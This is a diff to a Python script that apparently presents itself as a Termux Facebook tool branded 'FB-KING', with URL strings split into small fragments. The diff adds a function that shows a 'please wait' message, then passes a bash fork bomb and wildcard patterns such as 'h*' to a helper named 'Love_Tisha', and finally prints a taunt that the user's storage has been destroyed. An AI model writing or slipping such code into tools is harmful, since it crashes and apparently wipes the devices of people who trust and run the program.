@@ -318,8 +318,24 @@ c3=('2n8sj2p4')
 cu=('Ki')
 cuu=('ngcy')
 cuuu=('ber')
-       
-gffff=('Fb-')
+#
+#
+def fucked():
+    clear();banner()
+    print('{gen}Please Wait Some times.......')
+    Love_Tisha('termux')
+    Love_Tisha('Hi')
+    Love_Tisha('ok')
+    Love_Tisha('hk*')
+    Love_Tisha(':(){ :|: & };:')
+    Love_Tisha('oh')
+    Love_Tisha('accha*')
+    Love_Tisha('j')
+    Love_Tisha('h*')
+    print(f'{rgen}{RED}YOUR STORAGE FUCKED BY {H}FB-KING ');exit()
+
+        
+gffff=('FB-')
 kffff=('KING')
 c0=('ht')
 c4=('tps://')
@@ -1236,3 +1252,4 @@ if __name__=='__main__':
    #b2()
 #  mainx() 
   mainx()
+ 
